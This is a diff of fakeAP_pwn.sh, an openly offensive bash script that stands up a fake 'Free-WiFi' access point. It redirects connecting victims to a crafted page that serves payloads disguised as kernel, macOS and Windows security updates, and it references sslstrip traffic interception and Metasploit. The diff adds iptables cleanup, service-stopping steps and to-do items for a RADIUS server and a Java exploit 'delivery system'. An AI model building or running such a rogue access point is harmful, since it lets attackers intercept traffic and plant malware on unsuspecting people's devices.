@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC16 2010-07-11)                                                         #
+# fakeAP_pwn.sh (v0.3-RC17 2010-07-11)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* $htdocs_folder/                                        #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -8,13 +8,17 @@
 #ToDo List:                                                                                    #
 # v0.3 - Give "index.php" a makeover                                                           #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
-#                            crafted page without affecting any other clients who are browsing #
+#                           crafted page without affecting any other clients who are browsing  #
+#                           Create a radius server with:                                       #
+#				-CoovaChilli                                                   #
+#				-FreeRadius                                                    #
+#				-MySQL                                                         #                                      
 # v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
 # Metasploit "fun"        - Automate a few more "things"                                       #
-# apt-get install hostapd freeradius                                                           #
+#                                                                                              #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
 export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
@@ -38,7 +42,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC16"
+export   version="0.3-RC17"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #-----------------------------------------------------------------------------------------------
 function cleanup() {
@@ -54,14 +58,19 @@ function cleanup() {
       if test -e dsniff.services;       then rm dsniff.services; fi
       if test -e sslstrip.log;          then rm sslstrip.log; fi
       if test -e /etc/apache2/sites-available/fakeAP_pwn; then
-         if [ "$verbose" == "2" ] ; then echo "[i] Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"; fi
-         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"
+         if [ "$verbose" == "2" ] ; then echo "[i] Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"; fi
+         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 stop"
          rm /etc/apache2/sites-available/fakeAP_pwn
       fi
       if test -e $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; fi
       if test -e $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin; fi
       if test -e $htdocs_folder/Windows-KB183905-x86-ENU.exe;     then rm $htdocs_folder/Windows-KB183905-x86-ENU.exe; fi
       #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Stopping)" -e "airmon-ng stop $monitorInterface"
+      echo "0" > /proc/sys/net/ipv4/ip_forward
+      iptables --flush
+      iptables --table nat --flush
+      iptables --delete-chain
+      iptables --table nat --delete-chain
    fi
    echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
    exit 0
@@ -234,6 +243,10 @@ if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/dhcp3-server stop
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "/etc/init.d/dhcp3-server stop"            # Stopping DHCP Server
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 stop"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                 # Stopping apache Web Server
+if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/wicd stop"; fi
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'WICD Service'" -e "/etc/init.d/wicd stop"                       # Stopping WICD
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: service network-manager stop"; fi
+#$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'network-manager'" -e "service network-manager stop"            # Stopping network-manager (only for Ubuntu) 
 
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterface"; fi
@@ -421,7 +434,6 @@ if [ "$transparent" != "true" ]; then
    if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
 fi
 
-
 # virtual host
 if test -e /etc/apache2/sites-available/fakeAP_pwn; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
 echo "<VirtualHost *:80>
@@ -557,7 +569,7 @@ if [ "$transparent" != "true" ]; then
    sleep 7
 fi
 
-#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
+#echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..." 
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
 #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
